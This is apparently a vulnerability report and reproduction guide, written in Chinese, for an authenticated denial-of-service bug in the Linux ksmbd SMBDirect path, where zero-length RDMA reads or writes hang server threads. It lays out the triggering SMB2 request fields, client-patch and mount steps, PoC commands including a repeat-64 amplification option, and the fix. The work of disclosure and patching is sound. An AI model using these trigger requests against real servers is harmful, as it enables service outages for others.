# 0001 — smbdirect: reject zero-length RDMA read/write transfers (DoS)

## 漏洞概述

| 项目 | 内容 |
|---|---|
| 组件 | Linux 内核 `fs/smb/smbdirect` + `fs/smb/server` (ksmbd) |
| 类型 | 已认证远程拒绝服务 (Denial of Service) |
| 根因 | `smbdirect_connection_rdma_xmit()` 在 `buf_len == 0` 时 descriptor walk 立即结束（`desc_num == 0`），不 post 任何 RDMA work request、不产生 CQE，随后在空 `msg_list` 上执行 `list_last_entry()` 取得栈野指针，并对一个永不会被 `complete()` 的 on-stack completion 调用 `wait_for_completion()`（`TASK_UNINTERRUPTIBLE`、无超时）→ 工作线程永久阻塞。 |
| 触发 | 已认证客户端经 **SMBDirect (RDMA)** 传输发送零长度 RDMA 通道的 SMB2 WRITE / READ。 |
| 影响 | 单条请求冻结该连接的处理线程；重复触发可耗尽共享 `ksmbd-io` workqueue → 服务级确定性 DoS。`ret = msg->error` 的栈越界读在语义上存在，但因线程先永久阻塞而**不可达**，故不构成实际信息泄漏。 |
| 不受影响 | 纯 TCP 传输（`get_smbd_max_read_write_size()` 返回 0，RDMA 通道分支在 `smb2_write/read` 入口即被 `if (max_write_size == 0) return -EINVAL` 挡住）。 |
| 修复 | 在 `smbdirect_connection_rdma_xmit()` 中，descriptor walk 后若 `desc_num == 0` 直接 `return 0`（零长度传输是合法 no-op）；并在 ksmbd 的 RDMA 通道入口（`smb2_write`/`smb2_read`）对 `length == 0` 显式拒绝（纵深防御）。 |

## 漏洞代码定位（当前 HEAD `11028ab62899`）

- `fs/smb/server/smb2pdu.c`
  - `smb2_write()` RDMA 分支：`length = le32_to_cpu(req->RemainingBytes)`，**无 `length==0` 检查**。
  - `smb2_read()`：`length = le32_to_cpu(req->Length)`，**无 `length==0` 检查**。
  - `smb2_write_rdma_channel()` / `smb2_read_rdma_channel()`：`kvzalloc(length=0)` 返回非 NULL 的 `ZERO_SIZE_PTR`，`if (!data_buf)` 不触发 → 调用 `ksmbd_conn_rdma_read/write(buflen=0)`。
- `fs/smb/smbdirect/rw.c` `smbdirect_connection_rdma_xmit()`
  - descriptor walk 第一轮 `if (!buf_len) break;` → `desc_num == 0`。
  - `ib_post_send(sc->ib.qp, NULL, NULL)`：空 WR 链，不发 WR、不产 CQE。
  - `msg = list_last_entry(&msg_list, ...)`：空表 → 指向栈上 list_head 的野指针（UB）。
  - `wait_for_completion(&completion)`：唯一 `complete()` 在 CQE 回调（`rw.c:95`），永不到达 → **永久阻塞**。

## 触发请求形态

**SMB2 WRITE (RDMA 通道):**
```
Channel            = SMB2_CHANNEL_RDMA_V1 (0x1) 或 RDMA_V1_INVALIDATE (0x2)
Length             = 0
DataOffset         = 0
RemainingBytes     = 0          <-- ksmbd 以此作为 RDMA 传输长度
WriteChannelInfo   = >= 1 个 buffer descriptor (满足 ch_count >= 1)
```

**SMB2 READ (RDMA 通道):**
```
Channel            = SMB2_CHANNEL_RDMA_V1 (0x1) 或 RDMA_V1_INVALIDATE (0x2)
Length             = 0          <-- ksmbd 直接以此作为 RDMA 传输长度
ReadChannelInfo    = >= 1 个 buffer descriptor
```

> ksmbd 的 PDU 校验 (`smb2misc.c smb2_get_data_area_len`) 对 RDMA WRITE 用 `WriteChannelInfoLength` 计算数据区长度，**与 RemainingBytes 无关**；`ksmbd_smb2_check_message`、`smb2_validate_credit_charge` 都不检查 `RemainingBytes/Length == 0`。因此请求可完整通过解析，直达 RDMA 派发点。

---

## 复现环境要求

1. **内核**：启用 `CONFIG_SMB_SERVER`、`CONFIG_SMB_SERVER_SMBDIRECT`、`CONFIG_SMBDIRECT`。
2. **RDMA 硬件/软卡**：真实 RoCE/iWARP NIC，**或** 软件回环 `siw`（`CONFIG_RDMA_SIW`）+ `rdma_rxe`/`siw` 设备。QEMU/VM 内可用 `siw` 软卡复现。
3. **ksmbd 用户态守护**：`ksmbd.mountd` 配置一个共享，并在 `ksmbd.conf`/`smb.conf` 启用 SMBDirect（`smbd max protocol = SMB3_11`，RDMA 接口已注册）。
4. **凭据**：一个有效的 SMB 用户账号密码（漏洞是已认证后 DoS，不是认证绕过）。
5. **客户端**：能发起 SMBDirect 连接的客户端。最简单是 **Linux cifs.ko 客户端**（`mount -o vers=3.1.1,...,rdma`），或本目录的 Python PoC（用于构造精确请求字节 + TCP 烟雾测试）。

---

## 复现方法

### 方法 1（推荐，最贴近真实路径）：内核 C 客户端补丁法

完整 userspace SMBDirect 客户端工程量大。最稳妥的端到端触发是用内核 cifs 客户端，在 `smb2_write.c` / `smb2pdu.c`(client) 构造请求处把 RDMA WRITE 的 `Length`/`RemainingBytes` 强制为 0（或在发送 RDMA WRITE 前直接构造零长度请求），再经 `mount -o rdma` 触发。

最小步骤：
```bash
# 1. 准备 RDMA 软卡（VM 内）
modprobe siw
rdma link add siw0 type siw node_guid <guid>    # 或用 rdma_rxe

# 2. 启动 ksmbd（服务端，目标机）
# 配置 /etc/ksmbd/ksmbd.conf 和 ksmbd.adduser，然后
ksmbd.mountd &
# 确认 smbdirect 已就绪：dmesg | grep -i smbdirect

# 3. 客户端：应用一行补丁强制零长度 RDMA WRITE（演示用）
#    在 fs/smb/client/transport_rdma.c 的 send_write/right before POST 处，
#    或 fs/smb/client/smb2pdu.c 构造 SMB2 WRITE 时设 Length=RemainingBytes=0

# 4. 挂载并触发
mount -t cifs //<server>/<share> /mnt -o vers=3.1.1,rdma,sec=ntlmssp,username=<u>,password=<p>
# 触发一次写：dd if=/dev/zero of=/mnt/x bs=1 count=1
```

**预期（未打补丁）**：执行写后 `dd`/挂载点永久挂起；服务端 `ps -eo pid,stat,comm | grep ksmbd` 出现 **D 状态**（不可中断睡眠）的 ksmbd-io 线程，`cat /proc/<pid>/stack` 显示停在 `wait_for_completion`。重复触发会累积多个 D 线程并最终耗尽 workqueue。

**预期（已打补丁）**：写请求立即返回（0 字节 RDMA 传输被当作 no-op），服务端线程不阻塞，挂载点正常工作。

### 方法 2：Python PoC（请求构造 + TCP 烟雾测试）

本目录的 `poc_smbdirect_zero_length_dos.py` 构造出**精确的恶意 SMB2 WRITE/READ 请求字节**，并提供一个 TCP 烟雾 harness 证明请求在解析层被接受到派发点。

```bash
# 仅打印构造出的恶意请求字节（最安全）
python3 poc_smbdirect_zero_length_dos.py --emit-only --op both

# 构造 write 请求（rdma_v1 invalidate 通道）
python3 poc_smbdirect_zero_length_dos.py --op write --channel v1_invalidate \
       --host <server> --port 445

# 构造并重复 staging 多条（DoS 放大，需真实 RDMA 传输才实际生效）
python3 poc_smbdirect_zero_length_dos.py --op both --repeat 64
```

> **重要**：Python PoC 的 TCP 烟雾 harness **不是**真正的挂起复现——真正的 hang 发生在 SMBDirect (RDMA) 传输路径上（`fs/smb/smbdirect/`）。PoC 的价值是：(a) 给出可直接交付给真实 SMBDirect 客户端/抓包注入的精确请求字节；(b) 验证请求结构在解析层通过、无早期 framing 拒绝。要在 RDMA 上交付这些字节，使用方法 1 的内核客户端路径或一个完整 userspace SMBDirect 客户端。

---

## 验证步骤（确认漏洞/确认修复）

### 未打补丁（漏洞存在）
1. 触发零长度 RDMA WRITE/READ。
2. 服务端：
   ```bash
   ps -eo pid,stat,comm | grep -E 'ksmbd'
   # 出现 D 状态线程
   for p in $(pgrep ksmbd); do echo "== $p =="; cat /proc/$p/stack; done
   # 栈顶为 __schedule / schedule / wait_for_completion / smbdirect_connection_rdma_xmit
   ```
3. 连接挂起，无法再处理该连接的新请求；多次触发后 `ksmbd-io` workqueue 耗尽，新连接/新请求整体停滞。

### 已打补丁（修复生效）
1. 应用 `0001-smbdirect-reject-zero-length-rdma-rw.patch` 并重新编译/加载。
2. 触发同样的零长度 RDMA WRITE/READ：
   - `smb2_write/read` 入口的 `is_rdma_channel && !length` 守卫直接返回 `STATUS_INVALID_PARAMETER`（请求不会进入 smbdict xmit）；或
   - 即便绕过入口守卫，`smbdirect_connection_rdma_xmit` 的 `if (!desc_num) return 0;` 使零长度立即成功返回。
3. 服务端**无 D 状态线程**，`/proc/<pid>/stack` 不再出现 `wait_for_completion` 在 xmit 路径；连接与服务持续正常。

---

## 文件清单

| 文件 | 说明 |
|---|---|
| `0001-smbdirect-reject-zero-length-rdma-rw.patch` | 修复补丁（已 `git apply --check` 通过）|
| `poc_smbdirect_zero_length_dos.py` | PoC：构造零长度 RDMA WRITE/READ 请求 + TCP 烟雾 harness |
| `README.md` | 本操作手册 |

## 修复要点

- **首选单点修复**：`fs/smb/smbdirect/rw.c` `smbdirect_connection_rdma_xmit()`，descriptor walk 后 `if (!desc_num) return 0;`。
- **纵深防御**：`fs/smb/server/smb2pdu.c` 的 `smb2_write()`/`smb2_read()` RDMA 分支，`if (is_rdma_channel && !length) err = -EINVAL;`。
- 顺带合入 partial-post 修复系列（`smbdirect: wait for partially posted RDMA work requests` 等，处理另一处 use-after-free）。
